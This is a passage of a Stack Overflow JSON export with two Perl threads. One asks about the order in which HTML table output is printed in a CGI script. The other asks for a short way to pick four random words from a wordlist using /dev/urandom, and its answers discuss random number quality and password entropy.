<code>$bananas_rows</code> instead of printing it, and can then also be used as the flag to determine whether there is a table to print</p>\n\n<p>Note that I've used \"here documents\" which rather mess up the indentation, but are more readable than bare double quotes</p>\n\n<pre><code>my $bananas_rows; # Don't initialise variables without a reason\n\nwhile ( my @column = $sth-&gt;fetchrow_array() ) {\n\n    $bananas_rows .= &lt;&lt;END_HTML;\n&lt;tr&gt;\n    &lt;td&gt;$happyBananas[0]&lt;/td&gt;\n    &lt;td&gt;$hippieBananas[1]&lt;/td&gt;\n&lt;/tr&gt;\nEND_HTML\n\n}\n\n  if ( $bananas_rows == 1 ) {\n\n   print &lt;&lt;END_HTML;\n&lt;table&gt;\n  &lt;thead&gt;\n    &lt;tr&gt;\n      &lt;th&gt;Happy Bananas&lt;/th&gt;\n      &lt;th&gt;Hippie Bananas&lt;/th&gt;\n    &lt;/tr&gt;\n  &lt;/thead&gt;\n  &lt;tbody&gt;\nEND_HTML\n\n    print $bananas_rows;\n\n    print \"&lt;/tbody&gt;&lt;/table&gt;\"; \n\n}\n</code></pre>\n"}], "owner": {"reputation": 350, "user_id": 5243363, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/koXar.jpg?s=128&g=1", "display_name": "Ch&#252;ngel", "link": "https://stackoverflow.com/users/5243363/ch%c3%bcngel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 1, "accepted_answer_id": 41872730, "answer_count": 1, "score": -1, "last_activity_date": 1485441873, "creation_date": 1485430145, "last_edit_date": 1485441873, "question_id": 41872480, "link": "https://stackoverflow.com/questions/41872480/perl-variables-order-of-execution", "title": "Perl variables order of execution", "body": "<p>I am reading some values from an SQLite database, based on a form</p>\n\n<pre><code>my $Fruits= $FORM{Fruits}; \nmy $FruitsTable =0; \n</code></pre>\n\n<p>Once I get the values from the database, they should be stored in a variable called <code>my $SelectedFruits</code>.</p>\n\n<pre><code>while ( my @column = $sth-&gt;fetchrow_array() ) {\n\n    $FruitsTable = 1;\n\n    # Within the table there is a row called Tropical which contains bananas, guaves and oranges. I want to select bananas and guaves\n    my $SelectedFruits = print \"&lt;tr&gt;\n                           &lt;td&gt;$Tropical[0]&lt;/td&gt;\n                           &lt;td&gt;$Tropical[1]&lt;/td&gt;\n                     &lt;/tr&gt;\";\n}\n</code></pre>\n\n<p>if they are found, a table with my selection should be printed (my problem is when the printing order):</p>\n\n<pre><code>if ( $FruitsTable == 1 ) {\n\n    print \"&lt;table&gt;\n            &lt;thead&gt;\n              &lt;tr&gt;\n                &lt;th&gt;Bananas&lt;/th&gt;\n                 &lt;th&gt;Guave&lt;/th&gt;\n              &lt;/tr&gt;\n           &lt;/thead&gt;\n        &lt;tbody&gt;\";\n\n    $SelectedFruits;\n\n    print \"&lt;/tbody&gt;&lt;/table&gt;\";\n}\n</code></pre>\n\n<p>The code exits without errors.</p>\n\n<p>The problem here is that <code>$bananas</code> is printed first and the table's header and footer are printed afterwards, so the table looks crazy.</p>\n\n<p>How can I print the table's header first, then the <code>$bananas</code> and then the table's footer?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1485424724, "post_id": 41870231, "comment_id": 70923753, "body": "Does it have to be a shell script? Doing this completely in Perl is trivial."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485425706, "post_id": 41870231, "comment_id": 70924247, "body": "Is your use case a password or passphrase generator? That&#39;s the major reason to want to use a CSPRN.   Pruning back your &#39;one liner&#39; when you&#39;ve cryptographic integrity to consider seems a poor optimisation choice."}, {"owner": {"reputation": 37, "user_id": 7472824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4b17f45b830d41eccc0bafbd075518a?s=128&d=identicon&r=PG&f=1", "display_name": "Please Make It Shorter", "link": "https://stackoverflow.com/users/7472824/please-make-it-shorter"}, "edited": false, "score": 0, "creation_date": 1485426237, "post_id": 41870231, "comment_id": 70924534, "body": "It can be in purely in Perl, yes, but acquiring CSPRN from /dev/urandom is mandatory!"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485426404, "post_id": 41870231, "comment_id": 70924629, "body": "It would be worth clarifying why it&#39;s &quot;vital&quot; - if you&#39;re doing password/passphrase generation, then that&#39;s significantly reducing the solution scope."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485426487, "post_id": 41870231, "comment_id": 70924689, "body": "You appear to be asking for your work to be done for you for free. Such questions on Stack Overflow are frowned upon, to say the least: you are expected to be broadly skillful enough to write a solution yourself but it has so far eluded you. Do you know any Perl at all?"}, {"owner": {"reputation": 37, "user_id": 7472824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4b17f45b830d41eccc0bafbd075518a?s=128&d=identicon&r=PG&f=1", "display_name": "Please Make It Shorter", "link": "https://stackoverflow.com/users/7472824/please-make-it-shorter"}, "edited": false, "score": 0, "creation_date": 1485426624, "post_id": 41870231, "comment_id": 70924764, "body": "I don&#39;t think that my original oneliner can be shortened, but I am asking tha community, maybe someone knows it better, thats why the question."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1485426691, "post_id": 41870231, "comment_id": 70924806, "body": "I have trouble with the <i>Cryptographically Secure</i> part of your requirement. A selection of four words from a list is not a cryptogram, and the most ordinary random number generator wouldn&#39;t present a significant threat."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485427914, "post_id": 41870231, "comment_id": 70925417, "body": "I&#39;m not sure why &#39;short&#39; is considered desirable here. Surely if you&#39;re worried about crypto-integrity, the key thing is &#39;provably correct/good&#39; and length is almost entirely irrelevant?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485551927, "post_id": 41870231, "comment_id": 70988672, "body": "I did find a better way by using <code>od</code>, which directly returns the right range of ints from <code>&#47;dev&#47;urandom</code> so not much of the rest is needed. It is also much shorter, but more imortantly it is much simpler. My answer&#39;s rewritten for this."}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485425469, "post_id": 41871082, "comment_id": 70924111, "body": "There&#39;s a caveat - <code>rand</code> is not the same grade of random as <code>&#47;dev&#47;random</code> - it&#39;s good enough for random words, but would be unwise for crypographic passphrases or passwords (which is one use case I can envisage).  So something like <code>Crypt::Random</code> might be a better way of generating random numbers."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485425883, "post_id": 41871082, "comment_id": 70924334, "body": "@Sobrique I agree. But it&#39;s not a core module, and this sounds like core-only would be useful. Of course we could also just read from <code>&#47;dev&#47;random</code> ourselves. Is <code>&#47;dev&#47;random</code> different from <code>&#47;dev&#47;urandom</code>? In the question it&#39;s the latter."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485425964, "post_id": 41871082, "comment_id": 70924381, "body": "Not much. <code>&#47;dev&#47;random</code> is a variant that will block if there&#39;s low entropy in the random pool. For most purposes this is a moot point. <a href=\"http://www.2uo.de/myths-about-urandom/\" rel=\"nofollow noreferrer\">/dev/random vs. /dev/urandom</a>"}, {"owner": {"reputation": 37, "user_id": 7472824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4b17f45b830d41eccc0bafbd075518a?s=128&d=identicon&r=PG&f=1", "display_name": "Please Make It Shorter", "link": "https://stackoverflow.com/users/7472824/please-make-it-shorter"}, "edited": false, "score": 0, "creation_date": 1485426145, "post_id": 41871082, "comment_id": 70924483, "body": "Reading numbers from /dev/urandom is important, thank you!"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485426271, "post_id": 41871082, "comment_id": 70924555, "body": "It would be worth clarifying why in your question. If this is a passphrase or password generator, that&#39;s a specific use case that restricts the solution space significantly. <code>&#47;dev&#47;urandom</code> is a moot point if &quot;all&quot; you want is crypto-grade random."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 2, "last_activity_date": 1485503969, "last_edit_date": 1485503969, "creation_date": 1485425386, "answer_id": 41871082, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words/41871082#41871082", "title": "Shortest Perl solution for outputing 4 random words", "body": "<h1>This answer is not cryptographically safe!</h1>\n\n<p>I would do this completely in Perl. No need for a one-liner. Just grab your word-list and put it into a Perl program.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @words = qw(\nfirst\nsecond\nthird\nfourth\n);\n\nprint join( q{ }, map { $words[int rand @words] } 1 .. 4 ), \"\\n\";\n</code></pre>\n\n<p>This grabs four random words from the list and outputs them.</p>\n\n<p><code>rand @words</code> evaluates <code>@words</code> in scalar context, which gives the number of elements, and creates a random floating point value between 0 and smaller than that number. <code>int</code> cuts off the decimals. This is used as the index to grab an element out of <code>@words</code>. We repeat this four times with the <code>map</code> statement, where the <code>1 .. 4</code> is the same as passing a list of <code>(1, 2, 3, 4)</code> into <code>map</code> as an argument. This argument is ignored, but instead our random word is picked. <code>map</code> returns a list, which we <code>join</code> on one space. Finally we print the resulting string, and a newline.</p>\n\n<p>The word list is created with the quoted words <code>qw()</code> operator, which returns a list of quoted words. It's shorthand so you don't need to type all the quotes <code>'</code> and commas <code>,</code>.</p>\n\n<p>If you'd want to have the word list at the bottom you could either put the <code>qw()</code> in a <code>sub</code> and call it at the top, or use a <code>__DATA__</code> section and read from it like a filehandle.</p>\n"}, {"tags": [], "owner": {"reputation": 1979, "user_id": 2789312, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4OgOz.png?s=128&g=1", "display_name": "palik", "link": "https://stackoverflow.com/users/2789312/palik"}, "is_accepted": false, "score": -2, "last_activity_date": 1485427033, "creation_date": 1485427033, "answer_id": 41871578, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words/41871578#41871578", "title": "Shortest Perl solution for outputing 4 random words", "body": "<p>You could use <a href=\"https://metacpan.org/pod/Data::Random#rand_words()\" rel=\"nofollow noreferrer\">Data::Random::rand_words()</a></p>\n\n<pre><code>perl -MData::Random -E 'say join $/, Data::Random::rand_words(size =&gt; 4)'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 3, "last_activity_date": 1485452161, "last_edit_date": 1485452161, "creation_date": 1485427776, "answer_id": 41871826, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words/41871826#41871826", "title": "Shortest Perl solution for outputing 4 random words", "body": "<p>You mention needing a CSPRN, which makes this a non trivial exercise - if you need cryptographic randomness, then using built in stuff (like <code>rand</code>) is not a good choice, as the implementation is highly variable across platforms. </p>\n\n<p>But you've got <a href=\"https://metacpan.org/pod/Rand::Urandom\" rel=\"nofollow noreferrer\"><code>Rand::Urandom</code></a> which looks like it does the trick:</p>\n\n<blockquote>\n  <p>By default it uses the getentropy() (only available in > Linux 3.17) and falls back to /dev/arandom then /dev/urandom. </p>\n</blockquote>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Rand::Urandom;\n\nchomp ( my @words  = &lt;DATA&gt; ); \n\nprint $words[rand @words], \" \" for 1..4;\nprint \"\\n\";\n\n__DATA__\nyarn\nyard\nwound\nworst\nworry\nwork\nword\nwool\nwolf\nwish\nwise\nwipe\nwinter\nwing\nwind\nwife\nwhole\nwheat\nwater\nwatch\nwalk\nwake\nvoice\n</code></pre>\n\n<p>Failing that though - you can just read bytes from <code>/dev/urandom</code> directly:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nmy @number_of_words = 4;\n\nchomp ( my @words  = &lt;DATA&gt; ); \n\nopen ( my $urandom, '&lt;:raw', '/dev/urandom' ) or die $!;\nmy $bytes;\nread ( $urandom, $bytes, 2 * $number_of_words );  #2 bytes 0 - 65535\n\n#for testing\n#unpack 'n' is n  An unsigned short (16-bit)\n# unpack 'n*' in a list context returns a list of these. \nforeach my $value ( unpack ( \"n*\", $bytes ) ) {\n   print $value,\"\\n\"; \n}\n\n#actually print the words. \n#note - this assumes that you have the right number in your list. \n# you could add a % @words to the map, e.g. $words[$_ % @words]\n#but that will mean wrapping occurs, and will alter the frequency distribution. \n#a more robust solution would be to fetch additional bytes if the 'slot' is \n#empty. \nprint join \" \", ( map { $words[$_] } unpack ( \"n*\", $bytes )),\"\\n\";\n\n__DATA__\nyarn\nyard\nwound\nworst\n#etc.\n</code></pre>\n\n<p>Note - the above relies on the fact that your wordlist is the same size as two bytes (16 bits) - if this assumption <em>isn't</em> true, you'll need to deal with 'missed' words. A crude approach would be to take a modulo, but that would mean some wrapping and therefore not quite truly even distribution of word picks. Otherwise you can bit-mask and reroll, as indicated below:</p>\n\n<p>On a related point though - have you considered <em>not</em> using a wordlist, and instead using consonant-vowel-consonant groupings?</p>\n\n<p>E.g.:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\n#uses /dev/urandom to fetch bytes.\n#generates consonant-vowel-consonant groupings.\n#each are 11.22 bits of entropy, meaning a 4-group is 45 bits. \n#( 20 * 6 * 20 = 2400, which is 11.22 bits of entropy log2 2400\n#log2(2400 ^ 4) = 44.91\n#but because it's generated 'true random' it's a know entropy string.\n\nmy $num    = 4;\nmy $format = \"CVC\";\n\nmy %letters = (\n    V =&gt; [qw ( a e i o u y )],\n    C =&gt; [ grep { not /[aeiouy]/ } \"a\" .. \"z\" ], );\n\nmy %bitmask_for;\nforeach my $type ( keys %letters ) { \n   #find the next power of 2 for the number of 'letters' in the set.\n   #So - for the '20' letter group, that's 31. (0x1F)\n   #And for the 6 letter group that's 7.  (0x07)\n   $bitmask_for{$type} =  ( 2 &lt;&lt; log ( @{$letters{$type}} ) / log 2 ) - 1 ; \n}\n\nopen( my $urandom, '&lt;:raw', '/dev/urandom' ) or die $!;\n\nfor ( 1 .. $num ) {\n    for my $type ( split //, $format ) {\n        my $value;\n        while ( not defined $value or $value &gt;= @{ $letters{$type} } ) {\n            my $byte;\n            read( $urandom, $byte, 1 );\n            #byte is 0-255. Our key space is 20 or 6. \n            #So rather than modulo, which would lead to an uneven distribution,\n            #we just bitmask and discard and 'too high'. \n            $value = (unpack \"C\", $byte ) &amp; $bitmask_for{$type};\n        }\n        print $letters{$type}[$value];\n    }\n    print \" \";\n}\nprint \"\\n\";\nclose($urandom);\n</code></pre>\n\n<p>This generates 3 character CVC symbols, with a known entropy level (11.22 per 'group') for making reasonably robust passwords. (45 bits as opposed to the 64 bits of your original, although obviously you can add extra 'groups' to gain 11.22 bits per time). </p>\n"}, {"tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": false, "score": 1, "last_activity_date": 1485430333, "last_edit_date": 1485430333, "creation_date": 1485429994, "answer_id": 41872433, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words/41872433#41872433", "title": "Shortest Perl solution for outputing 4 random words", "body": "<p>The particular method using <code>tr</code> and <code>fold</code> on <code>/dev/urandom</code> is a lot less efficient than it could be, so let's fix it up a little bit, while keeping the <code>/dev/urandom</code> part.</p>\n\n<p>Assuming that available memory is enough to contain your script (including wordlist):</p>\n\n<pre><code>chomp(@words = &lt;DATA&gt;);\nopen urandom, \"/dev/urandom\" or die;\nread urandom, $randbytes, 4 * 2 or die;\nprint join(\" \", map $words[$_], unpack \"S*\", $randbytes), \"\\n\";\n__DATA__\nword\nlist\ngoes\nhere\n</code></pre>\n\n<p>This goes for brevity and simplicity without outright obfuscation \u2014 of course you <em>could</em> make it shorter by removing whitespace and such, but there's no reason to. It's self-contained and will work with several decades of perls (yes, those bareword filehandles are deliberate :-P)</p>\n\n<p>It still expects exactly 65536 entries in the wordlist, because that way we don't have to worry about introducing bias to the random number choice using a modulus operator. A slightly more ambitious approach might be to read 48 bytes from urandom for each word, turning it into a floating-point value between 0 and 1 (portable to <em>most</em> systems) and multiplying it by the size of the word list, allowing for a word list of any reasonable size.</p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485438577, "post_id": 41873555, "comment_id": 70931493, "body": "I&#39;m afraid I disagree with you on a couple of points - origin is extremely significant. It&#39;s easy enough to make a password that &#39;looks good&#39; and ticks all the boxes in terms of keyspace, but is actually deeply awful. <code>P4ssw0rd!</code> is not a strong password, despite being mixed case, symbols and numbers. And dictionary based attacks know this. By the book - <code>P4ssw0rd!</code> is 6.5 bits per character, for 58 bits... but it&#39;s clearly not that good."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485438697, "post_id": 41873555, "comment_id": 70931576, "body": "Dictionary attacks know this though - so it&#39;s very common to use transformation rules to reduce a 2^N type brute force approach to something considerably simpler. 1/65536 x 4 gives us a 16 bit symbol, and 4 of them. So 64 bits of entropy <i>even if</i> you have perfect knowledge of the algorithm. Assuming you have decent input RNG of course."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485438794, "post_id": 41873555, "comment_id": 70931639, "body": "... and that&#39;s a problem, because historically <code>rand()</code> has been very variable. For a while, the Windows implementation was 15 bits and time seeded, making it horribly easy to attack, simply because with a reasonable knowledge of generation time (and with password expiry, that&#39;s easy) you could simply guess them all. Known symbol space, generated from crypto-grade source gives more solid passwords than almost any &#39;user-pick&#39; option, because for every &#39;good&#39; password chooser, there&#39;s plenty who&#39;ll reuse or comply with the minimum based on the rules."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485439112, "post_id": 41873555, "comment_id": 70931834, "body": "(oops, sorry, that&#39;s a bit wordy. And maybe I&#39;ve misunderstood - if so, apologies)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485439613, "post_id": 41873555, "comment_id": 70932131, "body": "I don&#39;t understand your notation <i>1/65536 x 4 gives us a 16 bit symbol, and 4 of them</i>. But I agree with the 64 bit conclusion, and I guess I think that 64 bits isn&#39;t great. Even <code>P4ssw0rd!</code> is unsafe only because it&#39;s common and obvious, which is nothing to do with the OP&#39;s <i>&quot;many many GPUs/FPGAs&quot;</i> which are irrelevant for dictionary attacks."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485439861, "post_id": 41873555, "comment_id": 70932284, "body": "Well, that 65,536 is a 16 bit symbol, and you can just add the bits-per-symbol to get total password entropy. 64 bits <i>minimum</i> entropy (one of the strengths of this technique - you can easily estimate the minimum entropy, where &#39;user pick&#39; is highly variable) puts it a lot stronger than the very vast majority of passwords in use... :)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485439866, "post_id": 41873555, "comment_id": 70932288, "body": "My point is that, to benefit from a rough random number algorithm, you also need its sources (i.e. the time of generation, as you said) and the <i>algorithm that uses that source</i>. In the extreme example of a fifteen-bit generator with a sixteen-bit symbol set, I&#39;ll agree -- something better is needed. But with that same symbol set <code>&#47;dev&#47;urandom</code> is no more &quot;secure&quot; than any half-decent 32-bit generator"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485439980, "post_id": 41873555, "comment_id": 70932364, "body": "<i>&quot;for every &#39;good&#39; password chooser, there&#39;s plenty who&#39;ll reuse or comply with the minimum based on the rules&quot;</i> Yes, I guess there are people who will enter <code>a b c d</code> every time, and that easily pays for the use of an automated generator."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485440231, "post_id": 41873555, "comment_id": 70932550, "body": "<i>&quot;maybe I&#39;ve misunderstood - if so, apologies&quot;</i> You&#39;re experienced enough that you don&#39;t need to apologise. If there&#39;s any misunderstanding then it&#39;s as likely to be my choice of words that are at fault as your reading of them."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1485435180, "last_edit_date": 1485435180, "creation_date": 1485434020, "answer_id": 41873555, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words/41873555#41873555", "title": "Shortest Perl solution for outputing 4 random words", "body": "<p>A lot of nonsense is talked about password strength, and I think you're overestimating the worth of several of your requirements here</p>\n\n<ul>\n<li><p>I don't understand your preoccupation with making your code <em>\"much shorter with perl\"</em>. (Why did you pick Perl?) Savings here can only really be useful to make the script quicker to read and compile, but they will be dwarfed by the half megabyte of data following the code which must also be read</p></li>\n<li><p>In this context, the usefulness to a hacker of a poor random number generator  depends on prior knowledge of the construction of the password together with the passwords that have been most recently generated. With a sample of only 65,000 words, even the worst random number generator will show insignificant correlation between successive passwords</p>\n\n<p>In general, a password is more secure if it is longer, regardless of its contents. Forming a long password out of a sequence of English words is purely a way of making the sequence more memorable</p></li>\n<li><p><em>\"Of course later, the (hashing) iteration count ... would be extreme high, so brute-force [hacking?] would be very slow\"</em></p>\n\n<p>This doesn't follow at all. Cracking algorithms won't try to guess the four words you've chosen: they will see only a thirty-character (or so) string consisting only of lower-case letters and spaces, and whose origin is insignificant. It will be no more or less crackable than any other password of the same length with the same character set</p></li>\n</ul>\n\n<p>I suggest that you should rethink your requirements and so make things easier for yourself. I don't find it hard to think of four English words, and don't need a program to do it for me. <em>Hint:</em> <strong>pilchard</strong> <em>is a good one: they never guess that!</em></p>\n\n<p>If you still insist, then I would write something like this in Perl. I've used only the first 18 lines of your data for</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse List::Util 'shuffle';\n\nmy @s = map /\\S+/g, ( shuffle( &lt;DATA&gt; ) )[ 0 .. 3 ];\nprint \"@s\\n\";\n\n__DATA__\nyarn\nyard\nwound\nworst\nworry\nwork\nword\nwool\nwolf\nwish\nwise\nwipe\nwinter\nwing\nwind\nwife\nwhole\nwheat\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>wind wise winter yarn\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 7472824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4b17f45b830d41eccc0bafbd075518a?s=128&d=identicon&r=PG&f=1", "display_name": "Please Make It Shorter", "link": "https://stackoverflow.com/users/7472824/please-make-it-shorter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 723, "favorite_count": 2, "answer_count": 5, "score": 2, "last_activity_date": 1503811327, "creation_date": 1485422545, "last_edit_date": 1485865358, "question_id": 41870231, "link": "https://stackoverflow.com/questions/41870231/shortest-perl-solution-for-outputing-4-random-words", "title": "Shortest Perl solution for outputing 4 random words", "body": "<p>I have this one-line Unix shell script</p>\n\n<blockquote>\n  <p>for i in 1 2 3 4; do sed \"$(tr -dc '0-9' &lt; /dev/urandom | fold -w 5 |\n  awk '$0>=35&amp;&amp;$0&lt;=65570' | head -1)q;d\" \"$0\"; done | perl -p00e\n  's/\\n(?!\\Z)/ /g'</p>\n</blockquote>\n\n<p>The script has 65K words in it, one per line, from line 35 to 65570. The code and the data are in the same file. </p>\n\n<p>This script outputs 4 space-separated random words from this list with a newline at the end. For example</p>\n\n<pre><code>first fourth third second\n</code></pre>\n\n<p>How can I make this one-liner much shorter with Perl, keeping the</p>\n\n<pre><code>tr -dc 